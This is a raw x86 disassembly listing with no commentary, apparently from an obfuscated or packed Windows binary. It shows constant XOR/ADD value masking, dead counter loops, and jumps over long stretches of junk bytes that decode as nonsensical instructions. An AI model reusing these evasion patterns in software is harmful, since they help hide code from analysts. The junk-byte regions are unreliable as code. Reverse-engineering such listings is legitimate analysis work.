  40e04a:	mov    eax,DWORD PTR [ebp-0x70]
  40e04d:	xor    eax,esi
  40e04f:	add    eax,edi
  40e051:	mov    DWORD PTR [ebp-0x70],eax
  40e054:	lea    eax,[ebp-0x70]
  40e057:	push   eax
  40e058:	mov    eax,DWORD PTR [ebp-0xc]
  40e05b:	xor    eax,esi
  40e05d:	add    eax,edi
  40e05f:	push   eax
  40e060:	mov    eax,ds:0x41b1c8
  40e065:	push   0x41b11e
  40e06a:	push   DWORD PTR [eax]
  40e06c:	call   0x4120bb
  40e071:	xor    esi,esi
  40e073:	mov    eax,DWORD PTR [ebp+0x10]
  40e076:	sub    eax,esi
  40e078:	push   eax
  40e079:	mov    eax,DWORD PTR [ebp+0xc]
  40e07c:	add    eax,esi
  40e07e:	push   eax
  40e07f:	call   0x4099c9
  40e084:	inc    esi
  40e085:	cmp    esi,0x52
  40e088:	jb     0x40e073
  40e08e:	mov    eax,DWORD PTR [ebp-0xc]
  40e091:	call   0x406acb
  40e096:	lea    eax,[ebp+0x4]
  40e099:	mov    DWORD PTR [ebp-0x28],eax
  40e09c:	mov    eax,DWORD PTR [ebp-0x10]
  40e09f:	mov    eax,DWORD PTR [ebp-0x4]
  40e0a2:	push   DWORD PTR [ebp-0x8]
  40e0a5:	lea    eax,[ebp-0x28]
  40e0a8:	push   eax
  40e0a9:	call   0x410b90
  40e0ae:	mov    eax,ds:0x41b1a8
  40e0b3:	push   0x4
  40e0b5:	add    eax,0x1cc
  40e0ba:	push   eax
  40e0bb:	lea    eax,[ebp-0x10]
  40e0be:	push   eax
  40e0bf:	call   0x402976
  40e0c4:	mov    eax,DWORD PTR [ebp-0x10]
  40e0c7:	mov    eax,DWORD PTR [eax]
  40e0c9:	pop    edi
  40e0ca:	pop    esi
  40e0cb:	pop    ebx
  40e0cc:	leave  
  40e0cd:	ret    0xc
  40e0d0:	push   ebp
  40e0d1:	mov    ebp,esp
  40e0d3:	sub    esp,0x24
  40e0d6:	mov    eax,ds:0x41b1a8
  40e0db:	mov    eax,DWORD PTR [eax+0x198]
  40e0e1:	mov    DWORD PTR [ebp-0x8],eax
  40e0e4:	adc    ecx,eax
  40e0e6:	mov    eax,DWORD PTR [ebp+0x8]
  40e0e9:	mov    ecx,DWORD PTR [ebp-0x8]
  40e0ec:	xor    DWORD PTR ds:0x42fde9,0x42fdd5
  40e0f6:	push   ebx
  40e0f7:	push   esi
  40e0f8:	mov    esi,0x7510855
  40e0fd:	xor    eax,esi
  40e0ff:	not    ebx
  40e101:	push   edi
  40e102:	mov    edi,0x32729c
  40e107:	add    eax,edi
  40e109:	sbb    ebx,DWORD PTR ds:0x42fde9
  40e10f:	jmp    0x40e279
  40e114:	sub    dl,0xce
  40e117:	gs push 0x61
  40e11a:	mov    bh,0xf1
  40e11c:	fstp   DWORD PTR [ecx-0x53792fbc]
  40e122:	dec    eax
  40e123:	int    0x68
  40e125:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e126:	jo     0x40e198
  40e128:	ret    
  40e129:	jg     0x40e19b
  40e12b:	jo     0x40e1a4
  40e12d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e12e:	xor    BYTE PTR [ebx+ebp*4],cl
  40e131:	or     eax,0x8a991122
  40e136:	lock cmp dh,cl
  40e139:	inc    eax
  40e13a:	fmul   QWORD PTR [edi+0x2c3de869]
  40e140:	sub    eax,0xad6d57cf
  40e145:	inc    ebp
  40e146:	xor    al,0x69
  40e148:	pop    ss
  40e149:	stos   BYTE PTR es:[edi],al
  40e14a:	pop    ds
  40e14b:	shld   DWORD PTR [ebp-0x4f],ebx,0x7a
  40e150:	mov    ebp,0x67a85c49
  40e155:	pop    ecx
  40e156:	push   ds
  40e157:	push   ebx
  40e158:	or     DWORD PTR [ecx-0xf],edi
  40e15b:	sub    DWORD PTR [edx-0x77],eax
  40e15e:	pop    eax
  40e15f:	mov    bh,0xd7
  40e161:	es pop ds
  40e163:	sbb    eax,0xbacb3a25
  40e168:	ja     0x40e1db
  40e16a:	sbb    eax,0x63be85d
  40e16f:	jo     0x40e12d
  40e171:	jg     0x40e159
  40e173:	mov    WORD PTR [ebp-0x11cc27dd],fs
  40e179:	xor    DWORD PTR [ebx],ecx
  40e17b:	and    eax,esp
  40e17d:	adc    al,0xff
  40e17f:	das    
  40e180:	jne    0x40e1a9
  40e182:	cmp    ebx,DWORD PTR [ebp-0x33]
  40e185:	mov    dh,0xb6
  40e187:	sbb    DWORD PTR [esi+0x7f],esi
  40e18a:	add    dl,bl
  40e18c:	mov    eax,fs
  40e18e:	push   es
  40e18f:	push   es
  40e190:	xchg   ecx,eax
  40e191:	pop    ss
  40e192:	ins    DWORD PTR es:[edi],dx
  40e193:	aam    0xca
  40e195:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e196:	nop
  40e197:	inc    ecx
  40e198:	pop    ecx
  40e199:	mov    al,ds:0x1b3e1ee8
  40e19e:	js     0x40e1d9
  40e1a0:	mov    edx,edx
  40e1a2:	rcl    bh,cl
  40e1a4:	sbb    ch,dl
  40e1a6:	(bad)  
  40e1a7:	(bad)  
  40e1a9:	or     esp,0xe
  40e1ac:	fcmovnb st,st(5)
  40e1af:	das    
  40e1b0:	lahf   
  40e1b1:	mov    DWORD PTR [ebp+0x4edd54ac],esp
  40e1b7:	pop    ecx
  40e1b8:	sti    
  40e1b9:	enter  0x7cdf,0xc6
  40e1bd:	mov    ebp,0x306d92c
  40e1c2:	lods   al,BYTE PTR fs:[esi]
  40e1c4:	jae    0x40e231
  40e1c6:	adc    al,0xc9
  40e1c8:	mov    BYTE PTR [edi*2+0x59460647],al
  40e1cf:	icebp  
  40e1d0:	fst    QWORD PTR [esi+0x35]
  40e1d3:	int3   
  40e1d4:	mov    bh,0x3a
  40e1d6:	(bad)  
  40e1d7:	fistp  DWORD PTR [ecx]
  40e1d9:	mov    al,0xe8
  40e1db:	and    eax,0x117041ae
  40e1e0:	test   DWORD PTR [ebx+0x17],0xc0b498e
  40e1e7:	dec    ecx
  40e1e8:	cwde   
  40e1e9:	bound  ebp,QWORD PTR [ebx-0x55]
  40e1ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1ed:	cmc    
  40e1ee:	sbb    BYTE PTR [edx],ch
  40e1f0:	sub    DWORD PTR [edi+ecx*8],ebp
  40e1f3:	add    ecx,edx
  40e1f5:	ret    0x56a8
  40e1f8:	sub    esp,DWORD PTR [ebx]
  40e1fa:	push   ebp
  40e1fb:	pop    edx
  40e1fc:	add    dh,dl
  40e1fe:	jmp    0x951a0009
  40e203:	adc    ch,dl
  40e205:	stos   BYTE PTR es:[edi],al
  40e206:	sbb    DWORD PTR [esi+0x84a0504],edx
  40e20c:	in     eax,0x80
  40e20e:	test   edi,esp
  40e210:	mov    edx,0x325d426b
  40e215:	mov    ebx,0x25baedaa
  40e21a:	retf   
  40e21b:	imul   ebx,DWORD PTR [eax],0xa36549a6
  40e221:	jmp    0x6fa2846d
  40e226:	pop    ds
  40e227:	jnp    0x40e226
  40e229:	cdq    
  40e22a:	inc    ebp
  40e22b:	or     ebp,DWORD PTR [eax-0x18534f57]
  40e231:	pop    ds
  40e232:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e233:	fdivr  QWORD PTR [esi-0x462594d2]
  40e239:	call   0x7ab2:0x961def64
  40e240:	sub    DWORD PTR [eax-0x1f9e9275],ebx
  40e246:	call   0xb515ff8e
  40e24b:	push   ss
  40e24c:	mov    DWORD PTR [edi-0x28],edi
  40e24f:	jmp    0xa295:0xfbcd66fb
  40e256:	add    eax,0x7e23a88b
  40e25b:	push   ds
  40e25c:	push   ebp
  40e25d:	into   
  40e25e:	and    al,0x80
  40e260:	jne    0x40e232
  40e262:	ins    DWORD PTR es:[edi],dx
  40e263:	dec    esi
  40e264:	lahf   
  40e265:	cld    
  40e266:	popf   
  40e267:	retf   
  40e268:	repnz mov esp,0x2b18ed3f
  40e26e:	xchg   esi,eax
  40e26f:	sub    eax,0xbe6cdc4
  40e274:	jae    0x40e2b6
  40e276:	cld    
  40e277:	dec    ebx
  40e278:	dec    esp
  40e279:	mov    DWORD PTR [ecx],eax
  40e27b:	lea    eax,[ebp-0x4]
  40e27e:	and    DWORD PTR ds:0x42fdfd,0x0
  40e288:	mov    ecx,DWORD PTR ds:0x42fdfd
  40e28e:	inc    ecx
  40e28f:	mov    DWORD PTR ds:0x42fdfd,ecx
  40e295:	cmp    DWORD PTR ds:0x42fdfd,0x8
  40e29c:	jne    0x40e2b0
  40e2a2:	push   DWORD PTR [ebp-0x14]
  40e2a5:	push   0x5961
  40e2aa:	call   DWORD PTR ds:0x42e663
  40e2b0:	cmp    DWORD PTR ds:0x42fdfd,0x7
  40e2b7:	jne    0x40e2ca
  40e2bd:	mov    ecx,DWORD PTR ds:0x42fdfd
  40e2c3:	inc    ecx
  40e2c4:	mov    DWORD PTR ds:0x42fdfd,ecx
  40e2ca:	cmp    DWORD PTR ds:0x42fdfd,0x15
  40e2d1:	jb     0x40e288
  40e2d7:	and    DWORD PTR ds:0x42fe6e,0x0
  40e2e1:	jmp    0x40e2f3
  40e2e6:	mov    ecx,DWORD PTR ds:0x42fe6e
  40e2ec:	inc    ecx
  40e2ed:	mov    DWORD PTR ds:0x42fe6e,ecx
  40e2f3:	cmp    DWORD PTR ds:0x42fe6e,0x1b
  40e2fa:	jae    0x40e34c
  40e300:	cmp    DWORD PTR ds:0x42fe6e,0x9
  40e307:	jne    0x40e31b
  40e30d:	push   DWORD PTR [ebp-0x28]
  40e310:	push   0x42fe01
  40e315:	call   DWORD PTR ds:0x42e577
  40e31b:	cmp    DWORD PTR ds:0x42fe6e,0x8
  40e322:	jne    0x40e335
  40e328:	mov    ecx,DWORD PTR ds:0x42fe6e
  40e32e:	inc    ecx
  40e32f:	mov    DWORD PTR ds:0x42fe6e,ecx
  40e335:	jmp    0x40e2e6
  40e33a:	mov    ebx,DWORD PTR ds:0x42e894
  40e340:	mov    ecx,DWORD PTR ds:0x42e89c
  40e346:	sub    ebx,ecx
  40e348:	imul   ebx,DWORD PTR [ebx+ecx*1]
  40e34c:	mov    DWORD PTR [ebp-0x10],eax
  40e34f:	sub    ecx,ebx
  40e351:	mov    eax,DWORD PTR [ebp+0x8]
  40e354:	and    ebx,ecx
  40e356:	mov    ecx,DWORD PTR [ebp-0x10]
  40e359:	sbb    DWORD PTR ds:0x42fe72,ecx
  40e35f:	xor    eax,esi
  40e361:	add    eax,edi
  40e363:	mov    DWORD PTR [ecx],eax
  40e365:	jmp    0x40e4cf
  40e36a:	icebp  
  40e36b:	ja     0x40e334
  40e36d:	pop    ds
  40e36e:	inc    ecx
  40e36f:	scas   eax,DWORD PTR es:[edi]
  40e370:	icebp  
  40e371:	jno    0x40e314
  40e373:	push   edi
  40e374:	inc    eax
  40e375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e376:	fs retf 
  40e378:	mov    ch,0x9c
  40e37a:	cmp    esp,DWORD PTR [eax+esi*2+0x707fc370]
  40e381:	jo     0x40e32d
  40e383:	inc    esp
  40e384:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e385:	pop    ss
  40e386:	adc    edx,edi
  40e388:	xor    ebx,ebx
  40e38a:	sbb    BYTE PTR [edx-0x37172b22],dl
  40e390:	jnp    0x40e3d3
  40e392:	ja     0x40e3b2
  40e394:	stos   DWORD PTR es:[edi],eax
  40e395:	ins    BYTE PTR es:[edi],dx
  40e396:	call   0xda3d:0x56bd4ff9
  40e39d:	test   al,0x15
  40e39f:	dec    ecx
  40e3a0:	pop    esp
  40e3a1:	add    DWORD PTR [edi+0x18],edx
  40e3a4:	rcr    DWORD PTR es:[ecx+0x48],1
  40e3a8:	les    ecx,FWORD PTR [ecx]
  40e3aa:	mov    dh,dh
  40e3ac:	adc    eax,0x6609cfcc
  40e3b1:	push   ebx
  40e3b2:	ds mov ebp,0x82d69174
  40e3b8:	neg    DWORD PTR [esi+0x17]
  40e3bb:	sub    DWORD PTR [ecx],esi
  40e3bd:	dec    ecx
  40e3be:	test   cl,ah
  40e3c0:	xchg   ebx,eax
  40e3c1:	add    al,0x5
  40e3c3:	(bad)  
  40e3c4:	lods   eax,DWORD PTR ds:[esi]
  40e3c5:	sti    
  40e3c6:	pop    ecx
  40e3c7:	fldcw  WORD PTR [eax]
  40e3c9:	int    0x8f
  40e3cb:	pop    es
  40e3cc:	js     0x40e378
  40e3ce:	xor    BYTE PTR [esi],ch
  40e3d0:	dec    esi
  40e3d1:	data16 mov al,0xe4
  40e3d4:	ret    
  40e3d5:	push   eax
  40e3d6:	call   0x1803:0xfa62c71b
  40e3dd:	dec    ecx
  40e3de:	(bad)  
  40e3df:	mov    edx,0xac459f7a
  40e3e4:	sahf   
  40e3e5:	and    bl,BYTE PTR [esi-0x91a41]
  40e3eb:	out    dx,al
  40e3ec:	mov    ebx,0xf05aa33d
  40e3f1:	inc    ebx
  40e3f2:	in     al,0xb8
  40e3f4:	fcom   st(1)
  40e3f6:	imul   edi,DWORD PTR [eax+0x3f],0xd057aec3
  40e3fd:	inc    ebp
  40e3fe:	jmp    0xed0ec37b
  40e403:	mov    BYTE PTR [edi+0x6e],0x4
  40e407:	mov    DWORD PTR [edx+0x29],eax
  40e40a:	fisttp WORD PTR [ebp+0x9418ee1]
  40e410:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e411:	dec    ebp
  40e412:	jbe    0x40e3c0
  40e414:	daa    
  40e415:	mov    WORD PTR [ebp+0x685229ae],ss
  40e41b:	pusha  
  40e41c:	mov    cl,0xce
  40e41e:	xor    al,BYTE PTR [ebp+0x2269b471]
  40e424:	loope  0x40e3ae
  40e426:	dec    eax
  40e427:	xchg   ebx,eax
  40e428:	out    dx,eax
  40e429:	jecxz  0x40e483
  40e42b:	adc    eax,0x5ef4c1b8
  40e430:	push   ebp
  40e431:	jmp    FWORD PTR [eax-0x59]
  40e434:	jno    0x40e3bd
  40e436:	adc    cl,cl
  40e438:	pusha  
  40e439:	mov    ?,WORD PTR [eax+eiz*4+0x5edc2e9c]
  40e440:	icebp  
  40e441:	stc    
  40e442:	jecxz  0x40e465
  40e444:	sahf   
  40e445:	(bad)  
  40e446:	inc    ecx
  40e447:	test   eax,0x2d9ca378
  40e44c:	jbe    0x40e47f
  40e44e:	sub    BYTE PTR [edx-0x69ac4a18],dh
  40e454:	mov    ch,0x89
  40e456:	(bad)  
  40e457:	mov    edx,esp
  40e459:	(bad)  
  40e45a:	pop    ebx
  40e45b:	outs   dx,DWORD PTR ds:[esi]
  40e45c:	arpl   WORD PTR [ebx-0x4],sp
  40e45f:	mov    edi,0x40947bc7
  40e464:	retf   0xfae0
  40e467:	enter  0xf617,0x5
  40e46b:	aas    
  40e46c:	jnp    0x40e40d
  40e46e:	(bad)
  40e471:	stos   BYTE PTR es:[edi],al
  40e472:	pop    edx
  40e473:	jb     0x40e4c8
  40e475:	pop    ss
  40e476:	inc    esp
  40e477:	aaa    
  40e478:	inc    ebx
  40e479:	pusha  
  40e47a:	mov    ds:0x1943cb85,eax
  40e47f:	xchg   BYTE PTR [esi-0x2644b389],bh
  40e485:	dec    esp
  40e486:	xchg   esi,eax
  40e487:	imul   edx,esp,0xf45a3577
  40e48d:	mov    edi,0x644967ae
  40e492:	or     cl,dl
  40e494:	mov    edx,0x5ff79198
  40e499:	cdq    
  40e49a:	outs   dx,DWORD PTR ds:[esi]
  40e49b:	inc    ebx
  40e49c:	fisttp WORD PTR [edx+ebp*1]
  40e49f:	enter  0x96e6,0xcc
  40e4a3:	jb     0x40e514
  40e4a5:	jmp    0x40e4bc
  40e4a7:	mov    fs,WORD PTR [ebx+0x45]
  40e4aa:	les    eax,FWORD PTR [ebp+0x73]
  40e4ad:	cmp    BYTE PTR [ebx-0x53],bl
  40e4b0:	pop    ds
  40e4b1:	pop    ecx
  40e4b2:	mov    ah,0x5f
  40e4b4:	mov    eax,ds:0xf9eb9c1b
  40e4b9:	pushf  
  40e4ba:	sbb    edx,ebx
  40e4bc:	mov    ecx,0xfce98f4c
  40e4c1:	dec    eax
  40e4c2:	fwait
  40e4c3:	xor    DWORD PTR [esi],0x10fa07d4
  40e4c9:	sti    
  40e4ca:	std    
  40e4cb:	or     BYTE PTR [ebx-0xe],al
  40e4ce:	sti    
  40e4cf:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40e4d6:	and    ebx,0x399a
  40e4dc:	lea    eax,[ebp-0x18]
  40e4df:	mov    DWORD PTR [ebp-0x24],eax
  40e4e2:	jmp    0x40e64c
  40e4e7:	ror    DWORD PTR [eax+edi*4+0x61f15519],0x74
  40e4ef:	sbb    al,BYTE PTR ds:0x27c740f
  40e4f5:	mov    esi,0x70a38e40
  40e4fa:	jo     0x40e4bf
  40e4fc:	jg     0x40e56e
  40e4fe:	jo     0x40e554
  40e500:	or     al,0x9d
  40e502:	cwde   
  40e503:	into   
  40e504:	xchg   DWORD PTR [eax-0x50],ebx
  40e507:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e508:	enter  0xe044,0xad
  40e50c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e50d:	adc    eax,0x2592cba8
  40e512:	and    ch,BYTE PTR [esp+edi*2]
  40e515:	inc    edx
  40e516:	and    edx,DWORD PTR [ecx-0x1a7015d7]
  40e51c:	push   ebx
  40e51d:	or     al,0x16
  40e520:	add    eax,0xfbf1d3d3
  40e525:	nop
  40e526:	dec    ecx
  40e527:	lods   eax,DWORD PTR ds:[esi]
  40e528:	aaa    
  40e529:	rcl    BYTE PTR [esi+0x6e],cl
  40e52c:	aad    0xa5
  40e52e:	cmc    
  40e52f:	fcmovne st,st(6)
  40e531:	ds mov esi,0x8e689d5c
  40e537:	popf   
  40e538:	sahf   
  40e539:	mov    esp,0xbf54a9d1
  40e53e:	or     al,dl
  40e540:	or     bl,BYTE PTR [eax]
  40e542:	iret   
  40e543:	cmc    
  40e544:	ins    DWORD PTR es:[edi],dx
  40e545:	xor    DWORD PTR [ecx-0x5c],ebx
  40e548:	mov    ch,BYTE PTR [ebp+0x12]
  40e54b:	pop    eax
  40e54c:	(bad)  
  40e54d:	push   edx
  40e54e:	or     DWORD PTR [ecx+0x2b5db42f],edx
  40e554:	adc    dh,bl
  40e556:	xlat   BYTE PTR ds:[ebx]
  40e557:	imul   edx,DWORD PTR [edx+0x62033481],0x40
  40e55e:	loopne 0x40e553
  40e560:	fldenv [ebp+edx*8-0x473be64a]
  40e567:	repnz cli 
  40e569:	in     al,0x18
  40e56b:	push   es
  40e56c:	xchg   BYTE PTR [eax],ah
  40e56e:	mov    bl,0xa8
  40e570:	jo     0x40e591
  40e572:	sbb    DWORD PTR [ebp-0x2b],ebx
  40e575:	lock call 0xe4f5:0x2d502f8b
  40e57d:	fcom   QWORD PTR [ebp+ecx*2-0x2a]
  40e581:	pop    esi
  40e582:	test   DWORD PTR [ebp+0x22a83ada],esp
  40e588:	cs push ebp
  40e58a:	and    al,bl
  40e58c:	adc    BYTE PTR [edx+ecx*2+0x3b],dl
  40e590:	add    BYTE PTR [edi-0x3],dl
  40e593:	das    
  40e594:	cdq    
  40e595:	xchg   ebx,eax
  40e596:	sahf   
  40e597:	jnp    0x40e531
  40e599:	add    dl,bh
  40e59b:	or     al,0x6
  40e59d:	ins    DWORD PTR es:[edi],dx
  40e59e:	test   al,dl
  40e5a0:	loop   0x40e59b
  40e5a2:	xchg   ebx,eax
  40e5a3:	inc    edi
  40e5a4:	(bad)  
  40e5a5:	pop    ebp
  40e5a6:	sbb    DWORD PTR [ebx-0x3b],eax
  40e5a9:	(bad)  
  40e5aa:	enter  0xa76b,0xed
  40e5ae:	sub    al,0xbb
  40e5b0:	out    0xf,al
  40e5b2:	add    DWORD PTR [ebx+edx*4+0x2230b072],edi
  40e5b9:	ja     0x40e555
  40e5bb:	mov    dl,0x96
  40e5bd:	lock pop esi
  40e5bf:	jno    0x40e581
  40e5c1:	cmp    al,al
  40e5c3:	es in  al,dx
  40e5c5:	ds cmp esi,esp
  40e5c8:	mov    WORD PTR [ebp+ebx*2+0x1a],?
  40e5cc:	out    0xca,eax
  40e5ce:	jo     0x40e645
  40e5d0:	daa    
  40e5d1:	mov    dl,0xb7
  40e5d3:	mov    bl,0x61
  40e5d5:	stos   BYTE PTR es:[edi],al
  40e5d6:	jmp    0x3a1e:0x852cabca
  40e5dd:	xor    bh,cl
  40e5df:	dec    edi
  40e5e0:	popa   
  40e5e1:	adc    eax,0x2126bfc1
  40e5e6:	add    eax,0x1f670592
  40e5eb:	xor    BYTE PTR [edx-0x7a],ch
  40e5ee:	mov    eax,0x6c2c107a
  40e5f3:	adc    cl,ah
  40e5f5:	lock mov ch,0x28
  40e5f8:	aam    0x5a
  40e5fa:	jbe    0x40e5ef
  40e5fc:	mov    esp,0x1ed08da7
  40e601:	imul   esp,DWORD PTR [ebx+0x36],0x8f20ef2d
  40e608:	pop    esi
  40e609:	cmc    
  40e60a:	and    esi,DWORD PTR [edx+eax*4]
  40e60d:	cmp    BYTE PTR [eax-0x7c29f3a9],dl
  40e613:	pop    esi
  40e614:	push   edx
  40e615:	clc    
  40e616:	fadd   DWORD PTR [ecx]
  40e618:	mov    ah,0x29
  40e61a:	push   ebx
  40e61b:	sbb    ah,dh
  40e61d:	xor    DWORD PTR [edx-0x31],ecx
  40e620:	xor    DWORD PTR [ebx+0x7d7f1993],ebx
  40e626:	test   DWORD PTR [ebp+0x410f9250],edx
  40e62c:	fist   DWORD PTR [edx+0x739b2b3e]
  40e632:	fcmove st,st(5)
  40e634:	adc    BYTE PTR [ebp-0x42],ch
  40e637:	mov    al,cs:0x2edaeecd
  40e63d:	cmp    cl,BYTE PTR [esi-0x7d88721]
  40e643:	jmp    0x40e604
  40e645:	push   ss
  40e646:	jo     0x40e68d
  40e648:	dec    eax
  40e649:	jle    0x40e66d
  40e64b:	nop
  40e64c:	mov    eax,DWORD PTR [ebp-0x18]
  40e64f:	and    DWORD PTR ds:0x42fe7a,0x0
  40e659:	jmp    0x40e66b
  40e65e:	mov    ebx,DWORD PTR ds:0x42fe7a
  40e664:	inc    ebx
  40e665:	mov    DWORD PTR ds:0x42fe7a,ebx
  40e66b:	cmp    DWORD PTR ds:0x42fe7a,0x1e
  40e672:	jae    0x40e697
  40e678:	cmp    DWORD PTR ds:0x42fe7a,0x24
  40e67f:	jne    0x40e690
  40e685:	push   0x1cae
  40e68a:	call   DWORD PTR ds:0x42e57b
  40e690:	jmp    0x40e65e
  40e695:	neg    ebx
  40e697:	mov    ecx,DWORD PTR [ebp-0x24]
  40e69a:	add    ebx,0x74bf
  40e6a0:	xor    eax,esi
  40e6a2:	add    eax,edi
  40e6a4:	sub    DWORD PTR ds:0x42e21c,edx
  40e6aa:	mov    DWORD PTR [ecx],eax
  40e6ac:	mov    eax,ds:0x41b27c
  40e6b1:	adc    DWORD PTR ds:0x42fe01,ebx
  40e6b7:	mov    ebx,0x8e12febe
  40e6bc:	mov    DWORD PTR [ebp-0xc],ebx
  40e6bf:	adc    DWORD PTR ds:0x42fdd9,0x7944
  40e6c9:	jmp    0x40e833
  40e6ce:	cmp    dl,bl
  40e6d0:	in     al,dx
  40e6d1:	fcomi  st,st(1)
  40e6d3:	jecxz  0x40e69e
  40e6d5:	icebp  
  40e6d6:	xor    al,0x3a
  40e6d8:	iret   
  40e6d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6da:	sti    
  40e6db:	mov    ecx,ecx
  40e6dd:	(bad)  
  40e6de:	push   ecx
  40e6df:	mov    ds:0x7fc37070,al
  40e6e4:	jo     0x40e756
  40e6e6:	in     al,dx
  40e6e7:	mul    eax
  40e6e9:	jne    0x40e700
  40e6eb:	nop
  40e6ec:	hlt    
  40e6ed:	mov    dl,0xac
  40e6ef:	ret    0xf422
  40e6f2:	mov    edx,0xf31d01ef
  40e6f7:	lock jmp 0x6875:0x15199290
  40e6ff:	or     BYTE PTR [ebx],bh
  40e701:	shl    DWORD PTR [esp+ecx*4-0x59],1
  40e705:	lahf   
  40e706:	adc    ah,ah
  40e708:	push   0xffffffea
  40e70a:	nop
  40e70b:	repz jns 0x40e6ee
  40e70e:	push   0xffffffc3
  40e710:	fwait
  40e711:	ds aad 0xc6
  40e714:	into   
  40e715:	sub    DWORD PTR [ebx],ebx
  40e717:	loope  0x40e790
  40e719:	sub    al,0x7b
  40e71b:	popa   
  40e71c:	fnstcw WORD PTR [ebp-0x722db54b]
  40e722:	push   esi
  40e723:	loop   0x40e6fa
  40e725:	mov    al,ds:0xc999a251
  40e72a:	pop    edi
  40e72b:	test   BYTE PTR [edx+0x33],al
  40e72e:	mov    eax,ds:0x74c8bd89
  40e733:	xor    ebp,ebx
  40e735:	push   0xfe8cae77
  40e73a:	dec    ecx
  40e73b:	mov    dl,0x1d
  40e73d:	stos   BYTE PTR es:[edi],al
  40e73e:	nop
  40e73f:	std    
  40e740:	jb     0x40e752
  40e742:	fcom   DWORD PTR [ebx]
  40e744:	daa    
  40e745:	loope  0x40e72b
  40e747:	shr    DWORD PTR [eax],cl
  40e749:	shr    BYTE PTR [edi-0x31],1
  40e74c:	jno    0x40e6f6
  40e74e:	lahf   
  40e74f:	jl     0x40e7a9
  40e751:	dec    edi
  40e752:	loop   0x40e7c0
  40e754:	sbb    al,BYTE PTR [esi+0x7125a4eb]
  40e75a:	adc    al,BYTE PTR [edx]
  40e75c:	xor    al,0x9a
  40e75e:	mov    esp,DWORD PTR [edx-0x6]
  40e761:	dec    edx
  40e762:	out    dx,eax
  40e763:	xor    DWORD PTR [edi+0x5543f874],0xffffff8d
  40e76a:	ja     0x40e787
  40e76c:	or     al,0xcb
  40e76e:	ja     0x40e6f4
  40e770:	fild   QWORD PTR [edx+0x10]
  40e773:	jo     0x40e726
  40e775:	aad    0xc4
  40e777:	jle    0x40e737
  40e779:	nop
  40e77a:	imul   ebx,DWORD PTR [edx+0xf218a33],0xa1b63d30
  40e784:	adc    edx,DWORD PTR [esi-0x10]
  40e787:	rcr    edx,1
  40e789:	xlat   BYTE PTR ds:[ebx]
  40e78a:	daa    
  40e78b:	icebp  
  40e78c:	test   BYTE PTR [ebx+0x546a54ac],bl
  40e792:	sbb    BYTE PTR [edi+0x78],al
  40e795:	mov    ch,0x72
  40e797:	or     bl,BYTE PTR [ebp-0x1b]
  40e79a:	cwde   
  40e79b:	dec    edi
  40e79c:	ja     0x40e722
  40e79e:	dec    eax
  40e79f:	cli    
  40e7a0:	das    
  40e7a1:	ja     0x40e81e
  40e7a3:	nop
  40e7a4:	cwde   
  40e7a5:	nop
  40e7a6:	enter  0xdc6d,0x5a
  40e7aa:	dec    esp
  40e7ab:	sub    al,0xe8
  40e7ad:	cmc    
  40e7ae:	jno    0x40e7d3
  40e7b0:	stos   DWORD PTR es:[edi],eax
  40e7b1:	test   al,0x98
  40e7b3:	jmp    0x40e830
  40e7b5:	or     BYTE PTR [edi-0x45],cl
  40e7b8:	sbb    DWORD PTR [eax],ebp
  40e7ba:	popf   
  40e7bb:	sbb    al,BYTE PTR [ecx]
  40e7bd:	push   0xd01f827e
  40e7c2:	dec    ebx
  40e7c3:	or     ch,ah
  40e7c5:	pop    esp
  40e7c6:	mov    ecx,0xe8bff4f1
  40e7cb:	fiadd  DWORD PTR [ebp-0x1b]
  40e7ce:	movd   DWORD PTR [eax-0x466dbf74],mm7
  40e7d5:	call   0x8d64f12e
  40e7da:	aad    0x7b
  40e7dc:	sbb    bl,BYTE PTR [eax-0x2c161855]
  40e7e2:	loop   0x40e84e
  40e7e4:	mov    eax,0x27a1e253
  40e7e9:	dec    ebx
  40e7ea:	scas   al,BYTE PTR es:[edi]
  40e7eb:	fwait
  40e7ec:	out    dx,eax
  40e7ed:	mov    DWORD PTR [esi],ecx
  40e7ef:	sbb    eax,0x6cbc9df0
  40e7f4:	jge    0x40e808
  40e7f6:	hlt    
  40e7f7:	sub    BYTE PTR [esi+ebx*1+0x52],0xb4
  40e7fc:	gs dec ebp
  40e7fe:	xor    al,BYTE PTR ds:0x89fd493e
  40e804:	loopne 0x40e857
  40e806:	data16 adc ah,al
  40e809:	jge    0x40e84d
  40e80b:	pop    esp
  40e80c:	stos   BYTE PTR es:[edi],al
  40e80d:	jl     0x40e7a6
  40e80f:	push   ds
  40e810:	adc    BYTE PTR [ecx+0x5b],dh
  40e813:	ins    BYTE PTR es:[edi],dx
  40e814:	(bad)  
  40e815:	mov    bl,0x63
  40e817:	add    eax,0xce9f20bc
  40e81c:	add    al,al
  40e81e:	sbb    eax,0x2754bc71
  40e823:	or     al,0x9e
  40e825:	mov    BYTE PTR [ebx-0x39],al
  40e828:	(bad)  
  40e829:	pop    es
  40e82a:	dec    ebx
  40e82b:	cld    
  40e82c:	jno    0x40e7fd
  40e82e:	test   BYTE PTR [ebx-0x7a],ch
  40e831:	cmp    eax,0x81008b50
  40e836:	adc    eax,0x42fde9
  40e83b:	addr16 push eax
  40e83d:	add    BYTE PTR [eax],al
  40e83f:	mov    cx,WORD PTR [ebp-0x4]
  40e843:	xor    DWORD PTR ds:0x42fe0d,0x42fe7e
  40e84d:	movzx  ecx,cx
  40e850:	add    ecx,DWORD PTR [eax]
  40e852:	neg    eax
  40e854:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40e85b:	sbb    eax,0x5a1e
  40e860:	mov    DWORD PTR [ebp-0x1c],ecx
  40e863:	mov    eax,DWORD PTR [ebp+0x8]
  40e866:	sbb    ecx,DWORD PTR ds:0x42fde1
  40e86c:	mov    ecx,DWORD PTR [ebp-0x8]
  40e86f:	xor    DWORD PTR ds:0x42e21c,0x42e7ef
